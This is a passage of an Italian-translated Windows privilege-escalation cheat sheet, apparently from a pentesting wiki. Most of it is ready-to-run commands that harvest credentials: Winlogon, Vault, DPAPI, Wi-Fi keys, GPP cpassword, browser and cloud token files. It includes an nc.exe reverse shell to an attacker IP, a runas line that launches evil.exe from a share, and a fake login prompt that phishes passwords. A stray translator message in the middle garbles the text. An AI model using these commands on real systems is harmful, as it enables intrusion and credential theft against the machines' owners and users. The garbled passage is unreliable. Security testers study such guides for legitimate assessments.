Mitigazioni per gli sviluppatori
- Imposta sempre FILE_DEVICE_SECURE_OPEN quando crei device objects destinati a essere limitati da una DACL.
- Valida il contesto del caller per le operazioni privilegiate. Aggiungi controlli PP/PPL prima di consentire la terminazione di processi o il ritorno di handle.
- Limita gli IOCTLs (access masks, METHOD_*, input validation) e considera brokered models invece di privilegi diretti del kernel.

Idee di rilevamento per i difensori
- Monitora gli open in user-mode di nomi di device sospetti (e.g., \\ .\\amsdk*) e sequenze IOCTL specifiche indicative di abuso.
- Applica la Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) e mantieni le tue liste allow/deny.


## PATH DLL Hijacking

Se hai **write permissions inside a folder present on PATH** potresti essere in grado di hijack una DLL caricata da un processo e **escalate privileges**.

Verifica i permessi di tutte le cartelle presenti in PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Per maggiori informazioni su come sfruttare questo controllo:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Rete

### Condivisioni
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Verifica la presenza di altri computer noti hardcoded nel hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfacce di rete e DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Porte aperte

Verifica la presenza di **servizi ristretti** dall'esterno
```bash
netstat -ano #Opened ports?
```
### Tabella di routing
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabella ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Regole del Firewall

[**Controlla questa pagina per i comandi relativi al Firewall**](../basic-cmd-for-pentesters.md#firewall) **(elenca le regole, crea regole, disattiva, disattiva...)**

Altri[ comandi per l'enumerazione della rete qui](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Il binario `bash.exe` può anche essere trovato in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se ottieni root user puoi ascoltare su qualsiasi porta (la prima volta che usi `nc.exe` per ascoltare su una porta ti chiederà tramite GUI se a `nc` deve essere consentito l'accesso attraverso il firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Per avviare facilmente bash come root, puoi provare `--default-user root`

Puoi esplorare il `WSL` filesystem nella cartella `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenziali Windows

### Credenziali Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Gestore credenziali / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault memorizza le credenziali utente per server, siti web e altri programmi per i quali **Windows** può **eseguire automaticamente l'accesso degli utenti**. A prima vista, potrebbe sembrare che gli utenti possano salvare le credenziali di Facebook, Twitter, Gmail ecc., in modo da effettuare automaticamente il login tramite i browser. Ma non è così.

Windows Vault memorizza credenziali che Windows può usare per eseguire automaticamente l'accesso degli utenti, il che significa che qualsiasi **applicazione Windows che necessita di credenziali per accedere a una risorsa** (server o sito web) **può fare uso di questo Credential Manager** e Windows Vault e utilizzare le credenziali fornite invece che gli utenti inseriscano username e password ogni volta.

A meno che le applicazioni non interagiscano con Credential Manager, non penso sia possibile per loro usare le credenziali per una data risorsa. Quindi, se la tua applicazione vuole usare il vault, dovrebbe in qualche modo **comunicare con il credential manager e richiedere le credenziali per quella risorsa** dal vault di storage predefinito.

Usa il `cmdkey` per elencare le credenziali memorizzate sulla macchina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Puoi quindi usare `runas` con l'opzione `/savecred` per utilizzare le credenziali salvate. L'esempio seguente richiama un binario remoto tramite una SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Usare `runas` con un set di credential forniti.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Nota che mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), o dal [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

La **Data Protection API (DPAPI)** fornisce un metodo per la crittografia simmetrica dei dati, utilizzato principalmente nel sistema operativo Windows per la crittografia simmetrica delle chiavi private asimmetriche. Questa crittografia sfrutta un segreto dell'utente o del sistema che contribuisce in modo significativo all'entropia.

**DPAPI consente la crittografia delle chiavi tramite una chiave simmetrica derivata dai segreti di login dell'utente**. In scenari che coinvolgono la crittografia di sistema, utilizza i segreti di autenticazione di dominio del sistema.

Le chiavi RSA utente cifrate tramite DPAPI sono memorizzate nella directory %APPDATA%\Microsoft\Protect\{SID}, dove {SID} rappresenta lo [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) dell'utente. **La chiave DPAPI, co-located con la master key che protegge le chiavi private dell'utente nello stesso file**, è tipicamente costituita da 64 byte di dati casuali. (È importante notare che l'accesso a questa directory è ristretto, impedendo di elencarne il contenuto tramite il comando `dir` in CMD, anche se può essere elencata tramite PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Puoi usare **mimikatz module** `dpapi::masterkey` con gli argomenti appropriati (`/pvk` o `/rpc`) per decifrarlo.

Le **file delle credenziali protetti dalla master password** si trovano di solito in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Puoi usare **mimikatz module** `dpapi::cred` con l'appropriato `/masterkey` per decifrare.\
Puoi estrarre molte **DPAPI** **masterkeys** dalla **memoria** con il modulo `sekurlsa::dpapi` (se sei root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenziali PowerShell

**Credenziali PowerShell** sono spesso usate per **scripting** e attività di automazione come modo comodo per memorizzare credenziali criptate. Le credenziali sono protette usando **DPAPI**, il che tipicamente significa che possono essere decifrate solo dallo stesso utente sullo stesso computer in cui sono state create.

Per **decifrare** una credenziale PowerShell dal file che la contiene puoi fare:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Connessioni RDP salvate

Si trovano in `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
e in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandi eseguiti di recente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gestore credenziali Desktop remoto**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Usa il modulo **Mimikatz** `dpapi::rdg` con il `/masterkey` appropriato per **decriptare qualsiasi file .rdg**\
Puoi **estrarre molte DPAPI masterkeys** dalla memoria con il modulo Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Spesso gli utenti usano l'app StickyNotes sulle workstation Windows per **salvare password** e altre informazioni, senza rendersi conto che sia un file di database. Questo file si trova in `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` ed è sempre utile cercarlo ed esaminarlo.

### AppCmd.exe

**Nota che per recuperare le password da AppCmd.exe è necessario essere Administrator ed eseguire con un livello di High Integrity.**\
**AppCmd.exe** si trova nella directory `%systemroot%\system32\inetsrv\`.\  
Se questo file esiste, è possibile che alcune **credentials** siano state configurate e possano essere **recuperate**.

Questo codice è stato estratto da [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Controlla se `C:\Windows\CCM\SCClient.exe` esiste.\
Gli installer sono **eseguiti con privilegi SYSTEM**, molti sono vulnerabili a **DLL Sideloading (Info da** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## File e Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys nel registro

Le chiavi private SSH possono essere memorizzate nella chiave di registro `HKCU\Software\OpenSSH\Agent\Keys`, quindi dovresti controllare se c'è qualcosa di interessante al suo interno:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Se trovi una voce all'interno di quel percorso sarà probabilmente una SSH key salvata. È memorizzata crittografata ma può essere facilmente decrittata usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Ulteriori informazioni su questa tecnica: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Se il servizio `ssh-agent` non è in esecuzione e vuoi che si avvii automaticamente all'avvio esegui:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Sembra che questa tecnica non sia più valida. Ho provato a creare alcune ssh keys, aggiungerle con `ssh-add` e fare login via ssh su una macchina. Il registro HKCU\Software\OpenSSH\Agent\Keys non esiste e procmon non ha identificato l'uso di `dpapi.dll` durante l'autenticazione con chiave asimmetrica.

### File non presidiati
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Puoi anche cercare questi file usando **metasploit**: _post/windows/gather/enum_unattend_

Esempio di contenuto:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Backup di SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenziali cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Cerca un file chiamato **SiteList.xml**

### Password GPP memorizzata nella cache

Una funzionalità era precedentemente disponibile che permetteva il deployment di account locali amministratore personalizzati su un gruppo di macchine tramite Group Policy Preferences (GPP). Tuttavia, questo metodo presentava gravi vulnerabilità di sicurezza. Innanzitutto, i Group Policy Objects (GPOs), memorizzati come file XML in SYSVOL, potevano essere accessibili da qualsiasi utente di dominio. In secondo luogo, le password all'interno di questi GPP, criptate con AES256 usando una chiave di default pubblicamente documentata, potevano essere decriptate da qualsiasi utente autenticato. Ciò rappresentava un serio rischio, poiché poteva permettere agli utenti di ottenere privilegi elevati.

Per mitigare questo rischio, è stata sviluppata una funzione per scansionare i file GPP memorizzati localmente che contengono un campo "cpassword" non vuoto. Quando viene trovato un tale file, la funzione decripta la password e restituisce un oggetto PowerShell personalizzato. Questo oggetto include dettagli sul GPP e sulla posizione del file, aiutando nell'identificazione e nella mitigazione di questa vulnerabilità di sicurezza.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (precedente a Windows Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Per decriptare la cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Usando crackmapexec per ottenere le password:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### web.config di IIS
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Esempio di web.config con credenziali:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenziali OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Registri
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Chiedere le credentials

Puoi sempre **chiedere all'utente di inserire le sue credentials o anche le credentials di un altro utente** se pensi che le possa conoscere (nota che **chiedere** al cliente direttamente le **credentials** è davvero **rischioso**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Possibili nomi di file contenenti credenziali**

File noti che qualche tempo fa contenevano **passwords** in **clear-text** o **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Non hai fornito i file da cercare né il contenuto di src/windows-hardening/windows-local-privilege-escalation/README.md. Per favore incolla il contenuto del file o carica i file proposti che vuoi che io traduca.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenziali nel Cestino

Dovresti anche controllare il Cestino per cercare credenziali al suo interno

Per **recuperare password** salvate da diversi programmi puoi usare: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### All'interno del registro

**Altre possibili chiavi di registro con credenziali**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Cronologia dei browser

Devi cercare i db dove sono memorizzate le **passwords** di **Chrome o Firefox**.\
Controlla anche la cronologia, i segnalibri e i preferiti dei browser, perché potrebbero essere memorizzate lì alcune **passwords**.

Strumenti per estrarre passwords dai browser:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Sovrascrittura di DLL COM**

Component Object Model (COM) è una tecnologia integrata nel sistema operativo Windows che permette l'intercomunicazione tra componenti software scritti in linguaggi diversi. Ogni componente COM è identificato tramite un class ID (CLSID) e ogni componente espone funzionalità tramite una o più interfacce, identificate tramite interface IDs (IIDs).

Le classi e le interfacce COM sono definite nel registro sotto **HKEY\CLASSES\ROOT\CLSID** e **HKEY\CLASSES\ROOT\Interface** rispettivamente. Questo registro viene creato unendo **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

All'interno dei CLSID di questo registro puoi trovare la chiave figlia **InProcServer32** che contiene un **default value** che punta a una **DLL** e un valore chiamato **ThreadingModel** che può essere **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) o **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

In pratica, se puoi sovrascrivere una delle DLL che verranno eseguite, potresti escalate privileges se quella DLL verrà eseguita da un utente diverso.

Per capire come gli attaccanti usano COM Hijacking come meccanismo di persistenza, consulta:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Ricerca generica di password in file e registro**

**Cerca nei contenuti dei file**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Cerca un file con un determinato nome**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Cerca nel registro i nomi delle chiavi e le password**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Strumenti che cercano password

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **è un plugin msf** che ho creato per **automatically execute every metasploit POST module that searches for credentials** all'interno della vittima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) cerca automaticamente tutti i file che contengono password menzionati in questa pagina.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) è un altro ottimo strumento per estrarre password da un sistema.

Lo strumento [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) cerca **sessions**, **usernames** e **passwords** di diversi strumenti che salvano questi dati in chiaro (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

I segmenti di memoria condivisa, indicati come **pipes**, permettono la comunicazione tra processi e il trasferimento di dati.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Individuare un **processo privilegiato** che comunica tramite una pipe che puoi emulare offre l'opportunità di **ottenere privilegi più elevati** adottando l'identità di quel processo non appena interagisce con la pipe che hai creato. Per istruzioni su come eseguire un attacco di questo tipo, sono disponibili guide utili [**qui**](named-pipe-client-impersonation.md) e [**qui**](#from-high-integrity-to-system).

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Varie

### Estensioni di file che potrebbero eseguire codice in Windows

Vedi la pagina **[https://filesec.io/](https://filesec.io/)**

### **Monitorare le linee di comando per password**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Rubare password dai processi

## Da utente con privilegi bassi a NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Se si ha accesso all'interfaccia grafica (via console o RDP) e UAC è abilitato, in alcune versioni di Microsoft Windows è possibile eseguire un terminale o qualsiasi altro processo come "NT\AUTHORITY SYSTEM" partendo da un utente non privilegiato.

Questo rende possibile escalation dei privilegi e bypassare UAC allo stesso tempo con la stessa vulnerabilità. Inoltre, non è necessario installare nulla e l'eseguibile usato durante il processo è firmato e rilasciato da Microsoft.

Alcuni dei sistemi interessati sono i seguenti:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
